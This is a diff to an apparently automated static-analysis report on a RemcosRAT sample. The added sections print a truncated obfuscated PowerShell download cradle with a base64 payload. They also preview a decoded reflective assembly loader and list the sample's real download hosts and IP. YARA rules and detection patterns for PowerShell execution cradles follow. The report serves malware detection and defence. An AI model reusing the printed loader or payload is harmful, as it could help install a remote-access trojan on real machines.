@@ -2,7 +2,7 @@
 
 ## Executive Summary
 
-The agent selected one MalwareBazaar submission and performed static analysis on that single artifact. The sample was not executed, loaded, imported, or dynamically tested. Static evidence produced 3 IOCs and 1 code/string findings, plus 2 metadata-derived network indicator(s) listed separately below.
+The agent selected one MalwareBazaar submission and performed static analysis on that single artifact. The sample was not executed, loaded, imported, or dynamically tested. Static evidence produced 3 IOCs and 9 code/string findings, recovered 4 network indicator(s) by decoding the sample's own obfuscated/base64 payload layers, plus 2 metadata-derived network indicator(s) listed separately below.
 
 ## What The Agent Did
 
@@ -52,11 +52,95 @@ These indicators come from MalwareBazaar submission tags, not from bytes observe
 | IP | `46.183.223.7` | metadata |
 | Domain | `kelvin654.duckdns.org` | metadata |
 
+## Code Dissection
+
+### Deobfuscation
+
+The sample assembles a payload through string concatenation and then strips a junk token to reveal it. Reconstructing that string statically (no execution) recovers the launched command:
+
+```text
+powershell "$ddsfdfdjhsdfgdgo = 'DQAKAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADMADQAKAFsATgBlAHQALgBTAGUAcgB2AGkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQByAF0AOgA6AFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAIAA9ACAAWwBOAGUAdAAuAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAVAB5AHAAZQBdADoAOgBUAGwAcwAxADIADQAKACQAYgA2ADQAPQAnAGQAWABOAHAAYgBtAGMAZwBVADMAbAB6AGQARwBWAHQATwB5AEIAMQBjADIAbAB1AFoAeQBCAFQAZQBYAE4AMABaAFcAMAB1AFUAbQBWAG0AYgBHAFYAagBkAEcAbAB2AGIAagBzAGcAYwBIAFYAaQBiAEcAbABqAEkARwBOAHMAWQBYAE4AegBJAEYAQgBvAFkAVwA1ADAAYgAyADEASABZAFgAUgBsAGUAMwBCADEAWQBtAHgAcABZAHkAQgB6AGQARwBG...
+```
+
+### Decoded Payload Layers
+
+Each base64 layer was decoded as inert bytes (not executed). Network indicators recovered here come from the sample's own code, not from MalwareBazaar metadata.
+
+| Layer | Encoding | Recovered indicators | Preview |
+|---|---|---|---|
+| 1 | utf-16le | hxxp://kickstrean[.]art/1[.]jpg, hxxps://66[.]63[.]170[.]33/img/1[.]jpg, 66[.]63[.]170[.]33, kickstrean[.]art | `Start-Sleep -Seconds 3 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 $b64='dXNpbmcg...` |
+| 2 | utf-8 | — | `using System; using System.Reflection; public class PhantomGate{public static Assembly LoadAssembly(byte[] f){Assembl...` |
+
+### Functions
+
+#### `function quantumDrift(x, y)`
+
+- Behaviour: no flagged behaviour (likely decoy/helper)
+- Calls: `perturb`, `return`
+
+```javascript
+function perturb(v, shift) {
+        var n = (v ^ (v << shift) ^ (v >> 2));
+        n = (n * 13) & 0xFFFF;
+        return n;
+    }
+
+    return (perturb(x, 6) ^ 0x6D3F) + perturb(y, 4);
+```
+
+#### `function perturb(v, shift)`
+
+- Behaviour: no flagged behaviour (likely decoy/helper)
+- Calls: —
+
+```javascript
+var n = (v ^ (v << shift) ^ (v >> 2));
+        n = (n * 13) & 0xFFFF;
+        return n;
+```
+
+#### `function chaosPulse(x, y)`
+
+- Behaviour: no flagged behaviour (likely decoy/helper)
+- Calls: `distort`, `return`
+
+```javascript
+function distort(v, shift) {
+        var n = ((v << shift) ^ (v >> 5) ^ (v * 31)) & 0xFFFF;
+        return n;
+    }
+
+    return (distort(x, 3) ^ 0x3C3C) + distort(y, 6);
+```
+
+#### `function distort(v, shift)`
+
+- Behaviour: no flagged behaviour (likely decoy/helper)
+- Calls: —
+
+```javascript
+var n = ((v << shift) ^ (v >> 5) ^ (v * 31)) & 0xFFFF;
+        return n;
+```
+
+### Top-Level Execution Behaviour
+
+Behaviour detected across the sample (including recovered/deobfuscated code): `obfuscation`, `persistence`, `powershell_cradle`, `shell_execution`.
+
+
 ## Static Findings
 
 | Severity | Category | Evidence | Detail |
 |---|---|---|---|
+| high | shell_execution | `powershell(?:\.exe)?` | Matched 1 occurrence(s) |
+| high | powershell_cradle | `Invoke-Expression|\bIEX\b` | Matched 1 occurrence(s) |
+| high | powershell_cradle | `FromBase64String` | Matched 1 occurrence(s) |
 | medium | persistence | `Startup` | Matched 1 occurrence(s) |
+| high | obfuscation | `concat_replace_deobfuscation` | Recovered 1 concatenated/obfuscated payload string(s) |
+| medium | obfuscation | `base64_blob` | Found 3 long base64-like blob(s) |
+| info | decoded_hint | `S t a r t - S l e e p - S e c o n d s 3 [ N e t . S e r v i c e P o i n t M a n a g e r ] : : S e c u r i t` | Preview from base64-like blob; not executed |
+| info | decoded_hint | `) - a n d ( $ t = [ T e x t . E n c o d i n g ] : : U T F 8 . G e t S t r i n g ( $ g ) ) - m a t c h ' < < S T A '` | Preview from base64-like blob; not executed |
+| info | decoded_hint | `' R T > > ( . * ? ) < < E N D > > ' ) { $ g g f = ' 9 4 4 k 2 V / w a r / l a . s a / / : s g s f h f s f` | Preview from base64-like blob; not executed |
 
 ## Selected Strings
 
@@ -96,7 +180,10 @@ rule Static_Source_Malware_Indicators
     language_hint = "javascript"
     analysis = "static text only; sample not executed"
   strings:
-    $persistence_01 = /Startup/ nocase
+    $shell_execution_01 = /powershell(?:\.exe)?/ nocase
+    $powershell_cradle_02 = /Invoke-Expression|\bIEX\b/ nocase
+    $powershell_cradle_03 = /FromBase64String/ nocase
+    $persistence_04 = /Startup/ nocase
   condition:
     any of them
 }
@@ -114,11 +201,27 @@ rule Single_Sample_Metadata_Network_daf2410a4e6da576
   condition:
     any of them
 }
+
+
+rule Single_Sample_Decoded_Payload_daf2410a4e6da576
+{
+  meta:
+    source = "loop-engineering single-sample analysis (decoded payload layers)"
+    analysis = "indicators recovered by statically decoding embedded base64; not executed"
+    sha256 = "daf2410a4e6da576f80df9cfd4b69eb8b2ee74c49948a501d6618063c7950437"
+  strings:
+    $d01 = "http://kickstrean.art/1.jpg" nocase
+    $d02 = "https://66.63.170.33/img/1.jpg" nocase
+    $d03 = "66.63.170.33" nocase
+    $d04 = "kickstrean.art" nocase
+  condition:
+    any of them
+}
 ```
 
 ## Analyst Assessment
 
-MalwareBazaar labels this sample as `RemcosRAT`, so triage should start with that family context.
+MalwareBazaar labels this sample as `RemcosRAT`, so triage should start with that family context. High-severity static patterns were found, especially execution or script-loading indicators.
 
 ## Verification Notes
 
